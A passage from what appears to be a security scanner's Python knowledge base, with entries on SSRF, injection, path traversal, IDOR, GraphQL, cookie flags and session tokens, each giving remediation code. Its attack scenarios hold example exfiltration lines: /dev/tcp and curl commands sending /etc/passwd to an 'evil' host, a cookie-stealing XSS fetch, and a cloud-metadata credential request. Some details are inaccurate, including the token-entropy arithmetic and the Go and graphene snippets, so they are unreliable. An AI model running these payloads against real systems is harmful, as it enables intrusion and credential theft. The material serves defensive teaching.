    "code_examples": {
        "jinja2": "{{ user_input | e }}  # Jinja2 auto-escapes by default in HTML context",
        "react": "<div>{userInput}</div>  # React auto-escapes string children",
        "express": "app.set('view engine', 'handlebars');  // use {{value}} with triple-braces only when intentional",
        "php": "htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');",
        "python-flask": "from markupsafe import escape; return f'<div>{escape(q)}</div>'",
    },
}


SSRF_OOB_CALLBACK: VulnEntry = {
    "summary": (
        "A parameter accepts a URL that the server fetches on the user's "
        "behalf. An attacker can use this to reach internal services "
        "(databases, cloud metadata, admin panels) that are not accessible "
        "from the public internet, and exfiltrate their responses."
    ),
    "technical": (
        "Server-Side Request Forgery (SSRF) vulnerabilities occur when a "
        "web application fetches a remote resource based on user-supplied "
        "input without validating the URL. Because the request is made by "
        "the server, it can reach internal networks behind firewalls, the "
        "loopback interface (127.0.0.1), link-local addresses "
        "(169.254.169.254 for cloud metadata), and other resources that "
        "the public cannot. Modern cloud platforms expose instance "
        "metadata at 169.254.169.254 — AWS, Azure, and GCP all return "
        "IAM credentials there. SSRF is consistently in the OWASP Top 10 "
        "and was the vector for the 2019 Capital One breach."
    ),
    "attack_scenario": (
        "1. Attacker notices `https://target.example/fetch?url=...` accepts "
        "a URL parameter\n"
        "2. Attacker sends `?url=http://169.254.169.254/latest/meta-data/"
        "iam/security-credentials/`\n"
        "3. The server fetches its own cloud metadata endpoint and returns "
        "the temporary IAM credentials in the response body\n"
        "4. Attacker uses the credentials to access the cloud account — "
        "potentially exfiltrating S3 buckets, spinning up EC2 instances, "
        "or pivoting to other services\n\n"
        "redveil's `ssrf` check uses OOB (out-of-band) callback probing: "
        "it injects a URL pointing to the operator's own OOB domain "
        "(configured in `scope.yaml`) with a unique canary. The check "
        "DETECTS that the server made a request to the OOB URL by "
        "observing redirects, body references, or successful responses. "
        "Confirmation requires the operator to check their OOB log for the "
        "canary."
    ),
    "impact": (
        "Access to internal services: databases, Redis, Elasticsearch, "
        "Elasticsearch indices with PII. Cloud credential theft: AWS IAM "
        "credentials from the metadata endpoint enable full account "
        "compromise. Internal port scanning. Bypass IP-based access "
        "controls. Read local files via `file://` URLs (in vulnerable "
        "libraries)."
    ),
    "remediation": [
        "Validate URLs against an allowlist of schemes (https only) and "
        "hosts (only public-facing services).",
        "Resolve the hostname and check the resolved IP against private "
        "ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, "
        "169.254.0.0/16) — REJECT if matched.",
        "Disable HTTP redirects in the fetcher, or re-validate the redirect "
        "target.",
        "Use a network-level egress filter to prevent the application "
        "server from reaching internal subnets.",
    ],
    "code_examples": {
        "python-requests": (
            "import ipaddress\n"
            "from urllib.parse import urlparse\n"
            "import socket\n\n"
            "def safe_fetch(url):\n"
            "    parsed = urlparse(url)\n"
            "    if parsed.scheme not in ('http', 'https'):\n"
            "        raise ValueError('scheme not allowed')\n"
            "    ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))\n"
            "    if ip.is_private or ip.is_loopback or ip.is_link_local:\n"
            "        raise ValueError('internal IP blocked')\n"
            "    return requests.get(url, allow_redirects=False, timeout=5)"
        ),
        "node-fetch": (
            "const dns = require('dns');\n"
            "const net = require('net');\n"
            "function isPrivateIp(ip) {\n"
            "  return net.isIP(ip) && (\n"
            "    ip.startsWith('10.') || ip.startsWith('192.168.') ||\n"
            "    ip.startsWith('127.') || ip.startsWith('169.254.') ||\n"
            "    /^172\\.(1[6-9]|2\\d|3[01])\\./.test(ip)\n"
            "  );\n"
            "}\n"
            "dns.lookup(hostname, (err, addr) => {\n"
            "  if (isPrivateIp(addr)) throw new Error('blocked');\n"
            "});"
        ),
        "go": (
            "import (\n"
            "  \"net\"\n"
            "  \"net/url\"\n"
            ")\n"
            "func safeFetch(rawURL string) {\n"
            "  u, _ := url.Parse(rawURL)\n"
            "  if u.Scheme != \"https\" { return errors.New(\"scheme\") }\n"
            "  ips, _ := net.LookupIP(u.Hostname())\n"
            "  for _, ip := range ips {\n"
            "    if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {\n"
            "      return errors.New(\"internal IP blocked\")\n"
            "    }\n"
            "  }\n"
            "  return fetch(rawURL)\n"
            "}"
        ),
    },
}


TIME_BASED_INJECTION: VulnEntry = {
    "summary": (
        "A time-based side-channel indicates that user input is being "
        "interpreted as a command (shell, SQL, etc.) by a backend. By "
        "measuring response delays, an attacker can extract data one bit "
        "at a time, or — in the case of command injection — execute "
        "arbitrary code."
    ),
    "technical": (
        "Time-based blind injection relies on the backend's response time "
        "encoding information. For SQL: `IF(condition, SLEEP(5), 0)` makes "
        "the response slow only when the condition is true. For shell "
        "commands: `; sleep 5` makes the response slow if shell metacharacters "
        "are interpreted. redveil uses BOUNDED delays (3 seconds max) and "
        "compares against a baseline to detect statistically significant "
        "differences. The check does NOT extract data; it only observes "
        "the delay."
    ),
    "attack_scenario": (
        "1. Attacker injects `; sleep 3` into a parameter that ends up in a "
        "shell command\n"
        "2. If the response takes 3+ seconds longer than baseline, the "
        "parameter is being passed to a shell\n"
        "3. Attacker escalates: `; cat /etc/passwd > /dev/tcp/evil/443` "
        "(exfiltrate file content), or `; curl http://evil/$(cat "
        "/etc/passwd | base64)`\n\n"
        "redveil STOPS at step 2 — it only injects `sleep` commands and "
        "observes the delay. The actual exploitation (data extraction) "
        "is a manual step performed by the human researcher after reviewing "
        "the finding."
    ),
    "impact": (
        "Full code execution (for command injection): attacker can run any "
        "command the application can. Database exfiltration (for SQLi): "
        "attacker can dump the entire database by repeating timing probes. "
        "Both lead to data breach, lateral movement, and persistence."
    ),
    "remediation": [
        "Never concatenate user input into shell commands or SQL queries.",
        "Use parameterized queries for SQL (prepared statements).",
        "Use language-native APIs instead of shell invocation: subprocess "
        "with list args (no shell), database drivers with placeholders.",
        "Apply input validation: reject input containing shell metacharacters "
        "or SQL syntax in contexts where they're not expected.",
    ],
    "code_examples": {
        "python-subprocess": (
            "# BAD: os.system(f'ping {host}')\n"
            "# GOOD:\n"
            "import subprocess\n"
            "subprocess.run(['ping', '-c', '3', host], shell=False, "
            "timeout=5, capture_output=True)"
        ),
        "python-sql": (
            "# BAD: cursor.execute(f\"SELECT * FROM users WHERE id = {uid}\")\n"
            "# GOOD:\n"
            "cursor.execute(\"SELECT * FROM users WHERE id = %s\", (uid,))"
        ),
        "node-mysql": (
            "// BAD: connection.query(`SELECT * FROM users WHERE id = ${id}`)\n"
            "// GOOD:\n"
            "connection.execute('SELECT * FROM users WHERE id = ?', [id]);"
        ),
        "java": (
            "// BAD: stmt.executeQuery(\"SELECT * FROM users WHERE id = \" + id);\n"
            "// GOOD:\n"
            "PreparedStatement ps = conn.prepareStatement(\n"
            "  \"SELECT * FROM users WHERE id = ?\");\n"
            "ps.setString(1, id);\n"
            "ResultSet rs = ps.executeQuery();"
        ),
    },
}


PATH_TRAVERSAL: VulnEntry = {
    "summary": (
        "A parameter is used in a file path without proper validation. An "
        "attacker can use `../` sequences to escape the intended directory "
        "and read arbitrary files on the server — configuration, source "
        "code, secrets, or system files."
    ),
    "technical": (
        "Path traversal (a.k.a. directory traversal) vulnerabilities occur "
        "when an application constructs a file path by concatenating user "
        "input with a base directory, without sanitizing `../` sequences. "
        "By injecting `../../../etc/passwd` (or URL-encoded variants, "
        "Windows backslash forms, or double-encoded payloads), the attacker "
        "navigates up the directory tree. The OS resolves the path and "
        "returns the file. redveil uses UNIQUE CANARY filenames that "
        "cannot exist on the target — the proof of vulnerability is the "
        "RESPONSE PATTERN CHANGE (different status/length), not actual "
        "file content. This avoids any destructive file reads."
    ),
    "attack_scenario": (
        "1. Attacker finds `https://target.example/download?file=report.pdf`\n"
        "2. Attacker requests `?file=../../../../etc/passwd`\n"
        "3. The application reads `/var/www/downloads/../../../../etc/passwd` "
        "= `/etc/passwd`\n"
        "4. Response contains the system's password file → attacker harvests "
        "usernames, runs them against SSH, or uses them for further attacks\n\n"
        "redveil's `path-traversal` check uses canary filenames like "
        "`redveil_canary_<random_hex>.txt` that cannot exist on the target. "
        "If the response for the canary differs from the baseline (different "
        "status code or body length), the parameter likely accepts path "
        "traversal."
    ),
    "impact": (
        "Read source code, config files with secrets (database passwords, "
        "API keys), SSH private keys (`~/.ssh/id_rsa`), cloud credentials "
        "(`~/.aws/credentials`), and system files. In some cases, write "
        "access via traversal enables remote code execution."
    ),
    "remediation": [
        "Validate file paths against an allowlist. Do not construct paths "
        "by concatenating user input.",
        "Resolve the path (e.g. `os.path.realpath()`) and verify it's still "
        "within the allowed base directory.",
        "Reject input containing `..`, absolute paths, or null bytes.",
        "Run the application with a non-root user and minimal file system "
        "permissions so even successful traversal cannot read sensitive "
        "files.",
    ],
    "code_examples": {
        "python": (
            "import os\n"
            "BASE = '/var/www/downloads/'\n"
            "def safe_read(filename):\n"
            "    # Reject .., absolute paths, null bytes\n"
            "    if '..' in filename or filename.startswith('/') "
            "or '\\x00' in filename:\n"
            "        raise ValueError('invalid path')\n"
            "    full = os.path.realpath(os.path.join(BASE, filename))\n"
            "    if not full.startswith(os.path.realpath(BASE)):\n"
            "        raise ValueError('path escapes base')\n"
            "    with open(full) as f:\n"
            "        return f.read()"
        ),
        "node": (
            "const path = require('path');\n"
            "const BASE = '/var/www/downloads/';\n"
            "function safeRead(filename) {\n"
            "  if (filename.includes('..') || path.isAbsolute(filename)) {\n"
            "    throw new Error('invalid');\n"
            "  }\n"
            "  const full = path.resolve(BASE, filename);\n"
            "  if (!full.startsWith(BASE)) throw new Error('escapes base');\n"
            "  return fs.readFileSync(full, 'utf8');\n"
            "}"
        ),
        "java": (
            "File baseDir = new File(BASE).getCanonicalFile();\n"
            "File requested = new File(baseDir, filename).getCanonicalFile();\n"
            "if (!requested.getPath().startsWith(baseDir.getPath() + File.separator)) {\n"
            "    throw new SecurityException(\"path traversal blocked\");\n"
            "}"
        ),
    },
}


BOLA_IDOR: VulnEntry = {
    "summary": (
        "The endpoint authorizes the AUTHENTICATED user but does not check "
        "OWNERSHIP of the requested object. Any authenticated user can "
        "access any other user's resources by changing the object ID in "
        "the URL."
    ),
    "technical": (
        "BOLA (Broken Object Level Authorization, formerly IDOR) is the "
        "#1 vulnerability in the OWASP API Security Top 10. It occurs "
        "when the application verifies that the request is authenticated "
        "but does not verify that the requester owns the requested "
        "object. By changing `/api/users/123` to `/api/users/124`, the "
        "attacker reads another user's profile, orders, messages, or "
        "files. The fix is straightforward: every object access must "
        "check `if resource.owner_id == current_user.id` (or equivalent)."
    ),
    "attack_scenario": (
        "1. Attacker authenticates as themselves (Account A)\n"
        "2. Attacker identifies endpoints with object IDs: `/api/users/{id}`, "
        "`/api/orders/{id}`, `/api/files/{id}`\n"
        "3. Attacker enumerates IDs (1, 2, 3, ...) by incrementing the "
        "object ID\n"
        "4. For each ID, attacker requests the resource — server returns "
        "the data without checking ownership\n"
        "5. Attacker harvests data: PII, order history, private files, "
        "messages — affecting every user in the system\n"
        "6. Attacker escalates: modify the resource (if write access is "
        "also missing → BOLA + BFLA = account takeover)"
    ),
    "impact": (
        "Mass data exposure: PII, financial records, private messages, "
        "medical records — for every user in the system. Compliance "
        "violations: GDPR, HIPAA, PCI DSS. Account takeover: if the "
        "vulnerability also allows modification (BOLA on PUT/POST), "
        "attacker can change passwords, emails, or 2FA settings."
    ),
    "remediation": [
        "Every endpoint that accesses an object must verify ownership: "
        "`if resource.owner_id != current_user.id: return 403`.",
        "Use UUIDs for object IDs instead of sequential integers — this "
        "prevents enumeration but is NOT a substitute for authorization.",
        "Use an authorization middleware that automatically attaches "
        "ownership checks to all object-accessing endpoints.",
        "Log all cross-tenant access attempts for monitoring.",
    ],
    "code_examples": {
        "python-flask": (
            "@app.route('/api/users/<int:user_id>')\n"
            "@login_required\n"
            "def get_user(user_id):\n"
            "    user = User.query.get_or_404(user_id)\n"
            "    if user.id != current_user.id and not current_user.is_admin:\n"
            "        abort(403)\n"
            "    return user.to_dict()"
        ),
        "node-express": (
            "app.get('/api/users/:id', requireAuth, async (req, res) => {\n"
            "  const user = await User.findById(req.params.id);\n"
            "  if (!user) return res.status(404).end();\n"
            "  if (user.id !== req.user.id && !req.user.isAdmin) {\n"
            "    return res.status(403).json({ error: 'forbidden' });\n"
            "  }\n"
            "  res.json(user);\n"
            "});"
        ),
        "django": (
            "class UserDetail(LoginRequiredMixin, View):\n"
            "    def get(self, request, pk):\n"
            "        user = get_object_or_404(User, pk=pk)\n"
            "        if user != request.user and not request.user.is_staff:\n"
            "            raise PermissionDenied\n"
            "        return JsonResponse(user.to_dict())"
        ),
        "java-spring": (
            "@GetMapping(\"/api/users/{id}\")\n"
            "@PreAuthorize(\"@ownershipCheck.isOwner(#id, principal) or hasRole('ADMIN')\")\n"
            "public User getUser(@PathVariable Long id) {\n"
            "    return userRepository.findById(id).orElseThrow();\n"
            "}"
        ),
    },
}

# ---------------------------------------------------------------------------
# graphql
# ---------------------------------------------------------------------------

GRAPHQL_INTROSPECTION: VulnEntry = {
    "summary": (
        "GraphQL introspection is enabled in production. The full schema "
        "(types, fields, mutations) is publicly accessible. Attackers can "
        "map the entire API surface, including hidden mutations, sensitive "
        "fields, and deprecated endpoints that should never have been "
        "discoverable from the public internet without authentication or "
        "explicit authorization."
    ),
    "technical": (
        "GraphQL introspection (`{ __schema { types { name } fields { name } } }`) "
        "is a developer convenience that returns the full API schema. In "
        "production, it reveals internal types (User.role, Account.balance), "
        "hidden mutations (adminDeleteUser), and deprecated fields that "
        "should not be queried. While introspection is not directly "
        "exploitable, it accelerates reconnaissance by orders of magnitude "
        "compared to brute-forcing endpoint names and produces a complete "
        "map of the resolver graph that an attacker can target with "
        "field-level authorization tests and abuse queries."
    ),
    "attack_scenario": (
        "1. Attacker discovers `/graphql` responds to POST with "
        "Content-Type: application/json\n"
        "2. Attacker sends `{ __schema { types { name } } }` — server returns "
        "the full type list (User, Account, InternalConfig, etc.)\n"
        "3. Attacker queries each type's fields: `{ __type(name: \"User\") "
        "{ fields { name } } }`\n"
        "4. Attacker discovers hidden fields: User.ssn, User.apiKey, "
        "Account.internalBalance\n"
        "5. Attacker queries those fields directly via GraphQL — bypasses "
        "any URL-based access controls (e.g., `/api/users/{id}/ssn` would "
        "be blocked but `{ user(id: 1) { ssn } }` works)\n"
        "6. Attacker maps the entire data model in minutes and pivots to "
        "data exfiltration or BOLA/IDOR testing against every resolver"
    ),
    "impact": (
        "Rapid reconnaissance: full API surface in a single query. "
        "Discovery of hidden/sensitive fields. Bypass of URL-based access "
        "controls (since GraphQL routes by field, not URL). Combined with "
        "weak field-level authz: full data extraction across users, "
        "accounts, and internal configuration in seconds without any "
        "authentication in many real-world deployments."
    ),
    "remediation": [
        "Disable introspection in production: most GraphQL servers (Apollo, "
        "graphql-java, graphene) have a `disable_introspection` flag.",
        "If introspection is needed for tooling, gate it behind an auth "
        "check or environment variable so only operators can query it.",
        "Implement field-level authorization: every resolver should check "
        "the requester's permissions, not rely on the schema to hide fields.",
        "Use persisted queries to limit what clients can request, and apply "
        "depth/complexity limits at the gateway to block expensive queries.",
    ],
    "code_examples": {
        "apollo-server": (
            "const server = new ApolloServer({\n"
            "  typeDefs,\n"
            "  resolvers,\n"
            "  introspection: process.env.NODE_ENV !== 'production',\n"
            "});"
        ),
        "graphql-yoga": (
            "import { createServer } from 'graphql-yoga';\n"
            "createServer({\n"
            "  schema,\n"
            "  graphiql: process.env.NODE_ENV !== 'production',\n"
            "  introspection: process.env.NODE_ENV !== 'production',\n"
            "});"
        ),
        "graphql-java": (
            "GraphQLSchema schema = ...;\n"
            "RuntimeWiring.newRuntimeWiring(schema)\n"
            "  .fieldVisibility(StaticIntrospectionDisabledFieldVisibility.INSTANCE)\n"
            "  .build();"
        ),
        "python-graphene": (
            "schema = graphene.Schema(query=Query, mutation=Mutation)\n"
            "# Disable introspection in production\n"
            "if not settings.DEBUG:\n"
            "    schema.introspection_query = None  # or use middleware"
        ),
    },
}

# ---------------------------------------------------------------------------
# session-cookie
# ---------------------------------------------------------------------------

COOKIE_HTTPONLY_MISSING: VulnEntry = {
    "summary": (
        "The session cookie is not marked HttpOnly, meaning client-side "
        "JavaScript running on the same origin can read its value via "
        "`document.cookie`. Combined with any XSS vulnerability on the "
        "origin, this enables silent session hijacking — the attacker "
        "exfiltrates the cookie with a single line of JavaScript."
    ),
    "technical": (
        "The HttpOnly flag instructs the browser to forbid JavaScript from "
        "reading the cookie through `document.cookie`. The flag is enforced "
        "at the DOM layer: even if JavaScript runs on the origin, attempts "
        "to read an HttpOnly cookie return an empty string. Without this "
        "flag, the cookie is fully accessible to any script on the page. "
        "Modern frameworks set HttpOnly by default on session cookies, but "
        "many legacy applications, hand-rolled cookie code, and backends "
        "tuned for compatibility with JavaScript-driven legacy front-ends "
        "still omit the flag."
    ),
    "attack_scenario": (
        "1. Attacker finds a reflected XSS on the target origin (or uploads "
        "a payload via a stored XSS sink)\n"
        "2. Payload contains "
        "`fetch('https://evil.example/?c='+document.cookie)` or "
        "`new Image().src='//evil.example/?c='+document.cookie`\n"
        "3. The browser sends the session cookie (not HttpOnly) to the "
        "attacker's server in cleartext as part of the URL\n"
        "4. Attacker replays the cookie from their own browser — full "
        "authenticated session\n"
        "5. With HttpOnly set, `document.cookie` would return an empty "
        "string and the attack would fail"
    ),
    "impact": (
        "Session hijacking via XSS. Even with Content-Security-Policy in "
        "place, attackers may find ways to exfiltrate via DNS prefetch, "
        "CSS-based side channels, or compromise of an allowed CDN. The "
        "HttpOnly flag is the last line of defense against session theft "
        "from any client-side vulnerability."
    ),
    "remediation": [
        "Set the HttpOnly flag on every session cookie. In practice this "
        "should be the default — only opt out for cookies that must be "
        "read by JavaScript (rare).",
        "Combine with the Secure flag and SameSite=Strict for defense in "
        "depth.",
        "Audit cookie-setting code (response.set_cookie, Set-Cookie "
        "headers, framework session config) and add `httponly=True` (or "
        "the equivalent flag) everywhere a session token is written.",
    ],
    "code_examples": {
        "express": (
            "res.cookie('session', token, { httpOnly: true, secure: true, "
            "sameSite: 'strict' });"
        ),
        "flask": (
            "resp.set_cookie('session', token, httponly=True, secure=True, "
            "samesite='Strict')"
        ),
        "java": (
            "Cookie cookie = new Cookie(\"session\", token);\n"
            "cookie.setHttpOnly(true);\n"
            "cookie.setSecure(true);\n"
            "cookie.setPath(\"/\");"
        ),
        "django": (
            "# settings.py\n"
            "SESSION_COOKIE_HTTPONLY = True\n"
            "SESSION_COOKIE_SECURE = True\n"
            "SESSION_COOKIE_SAMESITE = 'Strict'"
        ),
        "nginx": (
            "# Set HttpOnly via proxy_cookie_flags:\n"
            "proxy_cookie_flags ~ HttpOnly Secure SameSite=Strict;"
        ),
    },
}

COOKIE_SECURE_MISSING: VulnEntry = {
    "summary": (
        "The session cookie is not marked Secure, so the browser sends it "
        "over any connection to the origin — including plaintext HTTP. A "
        "network attacker performing sslstrip or ARP spoofing can capture "
        "the cookie in cleartext and hijack the session."
    ),
    "technical": (
        "The Secure flag instructs the browser to only send the cookie over "
        "HTTPS. Without it, the cookie is transmitted on every request to "
        "the origin, regardless of protocol. On a hostile network (public "
        "Wi-Fi, ARP-spoofed LAN), an attacker can intercept the initial "
        "plaintext HTTP request and proxy it to the server while keeping "
        "the cookie in cleartext for themselves. The Secure flag pairs "
        "naturally with HSTS: HSTS upgrades the request to HTTPS, and "
        "Secure ensures the cookie is only sent on the upgraded connection."
    ),
    "attack_scenario": (
        "1. Victim joins coffee-shop Wi-Fi. Attacker on the same network "
        "performs sslstrip-style ARP spoofing\n"
        "2. Victim visits http://target.example/login — no HSTS pin yet\n"
        "3. Attacker intercepts the plaintext request, proxies to the "
        "real server, captures cookies on the wire\n"
        "4. Victim logs in: cookie (not Secure) is sent in the cleartext "
        "HTTP request\n"
        "5. Attacker replays the cookie from their browser — full account "
        "takeover"
    ),
    "impact": (
        "Session hijacking on any non-HTTPS request to the origin. The "
        "severity is highest when HSTS is not set (the user can be "
        "downgraded without warning) but the cookie still leaks via "
        "misconfigured proxies, accidental HTTP links, or legacy redirects. "
        "Combined with missing HSTS, this is a high-severity "
        "misconfiguration that fails most compliance scans."
    ),
    "remediation": [
        "Set the Secure flag on every session cookie.",
        "Pair with HSTS `max-age=31536000; includeSubDomains; preload` "
        "and submit to the HSTS preload list to ensure browsers always "
        "use HTTPS for the origin.",
        "Audit redirect chains: any redirect from HTTPS to HTTP leaks "
        "Secure-flagged cookies in the URL path or Referer header.",
        "Configure your reverse proxy or application to refuse plaintext "
        "HTTP requests entirely (return 301 to HTTPS).",
    ],
    "code_examples": {
        "express": (
            "res.cookie('session', token, { secure: true, httpOnly: true, "
            "sameSite: 'strict' });"
        ),
        "flask": (
            "resp.set_cookie('session', token, secure=True, httponly=True, "
            "samesite='Strict')"
        ),
        "java": (
            "Cookie cookie = new Cookie(\"session\", token);\n"
            "cookie.setSecure(true);\n"
            "cookie.setHttpOnly(true);"
        ),
        "django": (
            "# settings.py\n"
            "SESSION_COOKIE_SECURE = True\n"
            "CSRF_COOKIE_SECURE = True\n"
            "SECURE_SSL_REDIRECT = True"
        ),
        "nginx": (
            "# Globally mark cookies Secure:\n"
            "proxy_cookie_flags ~ Secure SameSite=Strict HttpOnly;\n\n"
            "# And force HTTPS at the listener:\n"
            "server { listen 80; return 301 https://$host$request_uri; }"
        ),
    },
}

COOKIE_SAMESITE_MISSING: VulnEntry = {
    "summary": (
        "The session cookie does not declare a SameSite attribute. Modern "
        "browsers default to `SameSite=Lax` for cookies without the "
        "attribute, but legacy browsers fall back to `None` — meaning the "
        "cookie is sent on cross-site requests. This enables session-riding "
        "and cross-origin CSRF attacks."
    ),
    "technical": (
        "SameSite restricts when a cookie is sent on cross-origin requests. "
        "`Strict` means the cookie is only sent on same-origin requests "
        "(never on cross-site navigations). `Lax` allows top-level GET "
        "navigation. `None` (the legacy default) sends the cookie on "
        "every request to the origin, including cross-site POSTs. Modern "
        "Chrome, Firefox, and Edge default to `Lax` for cookies without an "
        "explicit SameSite, but explicit declaration is required for "
        "defense in depth and to cover older browsers and embedded "
        "WebViews. Setting SameSite is mandatory for session cookies on "
        "any application that performs state-changing actions."
    ),
    "attack_scenario": (
        "1. Attacker hosts a malicious page at https://evil.example with "
        "an auto-submitting form pointing to https://target.example/transfer\n"
        "2. Victim visits evil.example while logged in to target.example\n"
        "3. Without SameSite, the browser sends the session cookie on "
        "the cross-origin POST\n"
        "4. The transfer executes in the victim's authenticated session\n"
        "5. With SameSite=Strict (or even Lax), the cookie is not sent "
        "and the request is unauthenticated"
    ),
    "impact": (
        "Cross-site request forgery (CSRF) and session-riding attacks. "
        "Any state-changing endpoint (transfer, change-email, post-comment) "
        "can be triggered cross-origin. Combined with no CSRF tokens, the "
        "application is fully exploitable. Even when CSRF tokens are "
        "issued, missing SameSite enables session-riding: the attacker "
        "sends authenticated GETs to read sensitive data without any "
        "CSRF token check."
    ),
    "remediation": [
        "Set SameSite=Strict on all session cookies. Use SameSite=Lax only "
        "if you have a legitimate need for top-level GET navigation to "
        "carry the session.",
        "Pair with anti-CSRF tokens on state-changing endpoints. SameSite "
        "is a strong default but explicit CSRF tokens are required for "
        "defense in depth.",
        "If you must use SameSite=None (rare — embedded iframes in third-"
        "party contexts), you must also set Secure and use HTTPS.",
        "Audit framework session configuration and any custom Set-Cookie "
        "emitted from your application code.",
    ],
    "code_examples": {
        "express": (
            "res.cookie('session', token, { sameSite: 'strict', "
            "httpOnly: true, secure: true });"
        ),
        "flask": (
            "resp.set_cookie('session', token, samesite='Strict', "
            "httponly=True, secure=True)"
        ),
        "java": (
            "Cookie cookie = new Cookie(\"session\", token);\n"
            "cookie.setAttribute(\"SameSite\", \"Strict\");\n"
            "// Servlet 4.0+ only — older containers need a workaround"
        ),
        "django": (
            "# settings.py\n"
            "SESSION_COOKIE_SAMESITE = 'Strict'\n"
            "CSRF_COOKIE_SAMESITE = 'Strict'"
        ),
        "nginx": (
            "# Globally mark all cookies SameSite=Strict:\n"
            "proxy_cookie_flags ~ SameSite=Strict HttpOnly Secure;"
        ),
    },
}

WEAK_SESSION_TOKEN: VulnEntry = {
    "summary": (
        "The session cookie's value has low Shannon entropy or is short "
        "enough to be brute-forced. Predictable session identifiers let an "
        "attacker guess or enumerate valid tokens and impersonate other "
        "users without ever stealing a cookie."
    ),
    "technical": (
        "Session tokens must be generated from a cryptographically secure "
        "random number generator (CSPRNG) and produce at least 128 bits "
        "of entropy. A typical 16-byte random hex token has 4 bits per "
        "character (8 chars) and 64 bits total — too low; modern "
        "frameworks use 32-byte tokens (256 bits). Tokens derived from "
        "time, user ID, sequential counters, or weak PRNGs (Java's "
        "`Random`, Python's `random` without seeding) are predictable. "
        "An attacker who knows or guesses the generation algorithm can "
        "enumerate valid tokens in seconds. Indicators of weakness: short "
        "length (< 16 chars), low character variety (all digits, all "
        "lowercase), predictable structure (incremented IDs, base64 of "
        "timestamps)."
    ),
    "attack_scenario": (
        "1. Attacker registers an account on the target, inspects their "
        "own session cookie: `PHPSESSID=123456` (6 digits, low entropy)\n"
        "2. Attacker observes that the token format is `<user_id>` and "
        "guesses other users' session tokens by incrementing\n"
        "3. Attacker requests /api/profile/me with `Cookie: PHPSESSID=3` "
        "and is authenticated as user 3\n"
        "4. With a known algorithm (timestamp + user_id XORed), the "
        "attacker brute-forces all active sessions in seconds\n"
        "5. Mass session hijacking without any XSS, CSRF, or credential "
        "compromise"
    ),
    "impact": (
        "Mass session hijacking. The attacker doesn't need to steal a "
        "cookie — they generate valid session tokens algorithmically and "
        "use them directly. This is the highest-impact authentication "
        "weakness: there is no exploit chain, no social engineering, no "
        "XSS. The attacker simply guesses. Detected-after-the-fact "
        "indicators are weak: the session logs show legitimate-looking "
        "activity from the attacker's IP."
    ),
    "remediation": [
        "Generate session tokens using a CSPRNG: `secrets.token_urlsafe(32)` "
        "in Python, `crypto.randomBytes(32)` in Node.js, "
        "`java.security.SecureRandom` in Java.",
        "Use at least 128 bits of entropy (16 random bytes). 256 bits "
        "(32 bytes) is preferred for long-lived sessions.",
        "Avoid using user ID, timestamp, or any predictable input as the "
        "session identifier.",
        "Audit session token generation in any custom auth code. Most "
        "frameworks do this correctly by default — the weakness typically "
        "appears in hand-rolled auth, old PHP code, or legacy Java "
        "applications.",
    ],
    "code_examples": {
        "python": (
            "import secrets\n"
            "# 32 bytes -> 256 bits of entropy, URL-safe base64:\n"
            "session_id = secrets.token_urlsafe(32)\n\n"
            "# NEVER:\n"
            "session_id = str(user.id)         # predictable\n"
            "session_id = str(int(time.time())) # predictable"
        ),
        "node": (
            "const crypto = require('crypto');\n"
            "// 32 random bytes -> 256 bits:\n"
            "const sessionId = crypto.randomBytes(32).toString('base64url');\n\n"
            "// NEVER:\n"
            "const sessionId = String(user.id);"
        ),
        "java": (
            "import java.security.SecureRandom;\n"
            "SecureRandom rng = new SecureRandom();\n"
            "byte[] tokenBytes = new byte[32];\n"
            "rng.nextBytes(tokenBytes);\n"
            "String sessionId = Base64.getUrlEncoder()\n"
            "    .withoutPadding()\n"
            "    .encodeToString(tokenBytes);\n\n"
            "// NEVER use java.util.Random — not cryptographically secure."
        ),
        "php": (
            "// PHP 7+:\n"
            "$sessionId = bin2hex(random_bytes(32));\n\n"
            "// NEVER:\n"
            "$sessionId = mt_rand();           // weak PRNG\n"
            "$sessionId = $user->id;           // predictable"
        ),
        "go": (
            "import (\n"
            "    \"crypto/rand\"\n"
            "    \"encoding/base64\"\n"
            ")\n\n"
            "b := make([]byte, 32)\n"
            "rand.Read(b)\n"
            "sessionId := base64.RawURLEncoding.EncodeToString(b)"
        ),
    },
}

TOKEN_LEAKAGE: VulnEntry = {
    "summary": (
        "A sensitive token (API key, session ID, password reset token) "
        "appears in a URL query parameter and is reflected in the response "
        "body. Tokens in URLs are leaked to: server access logs, browser "
        "history, the `Referer` header sent to any third-party resource "
        "the page loads, and to any analytics or tag manager scripts the "
        "page includes."
    ),
    "technical": (
        "URL query parameters are not a secure channel for secrets. They "
        "are logged by every HTTP proxy, CDN, and web server along the "
        "request path. They appear in browser history, bookmarks, and "
        "sync services. When the user navigates away, the `Referer` header "
        "sent to the destination site contains the full URL — including "
        "the query string — unless Referrer-Policy is set to `no-referrer` "
        "or `same-origin`. Analytics scripts (Google Analytics, Mixpanel, "
        "Sentry, Hotjar) routinely capture the full URL as page-view "
        "metadata. Tokens in URLs are a classic source of accidental "
        "exposure: even if the application logic is correct, the token "
        "leaks through every layer that observes URLs."
    ),
    "attack_scenario": (
        "1. Application sends password-reset link via email: "
        "`https://target.example/reset?token=abcd1234...`\n"
        "2. Application renders a page that includes a third-party "
        "analytics script (analytics.example.com)\n"
        "3. When the page loads, the analytics script captures the full "
        "URL — including the reset token — and sends it to its own "
        "backend\n"
        "4. Alternatively, the user clicks an outbound link from the "
        "reset page; the destination site receives "
        "`Referer: https://target.example/reset?token=abcd1234...`\n"
        "5. Attacker (controlling analytics.example.com or harvesting "
        "Referer logs) captures the token and uses it to reset the "
        "victim's password"
    ),
    "impact": (
        "Token theft via side channels. The attacker may never interact "
        "with the application directly — they receive the token via "
        "analytics traffic, Referer logs, or compromised upstream proxies. "
        "This is one of the most common sources of real-world API key "
        "and reset token exposure."
    ),
    "remediation": [
        "Never put tokens in URLs. Use POST bodies for sensitive state, "
        "or one-time tokens with very short expiry stored server-side and "
        "looked up by an opaque ID.",
        "Set Referrer-Policy to `no-referrer` or `same-origin` to prevent "
        "the URL from leaking to third-party sites via Referer.",
        "Audit server access logs and CDN logs for tokens — if you find "
        "them, treat as compromised and rotate.",
        "If you must use URL tokens, make them one-time, short-lived "
        "(<5 minutes), and tied to a server-side session that is "
        "invalidated after first use.",
    ],
    "code_examples": {
        "general": (
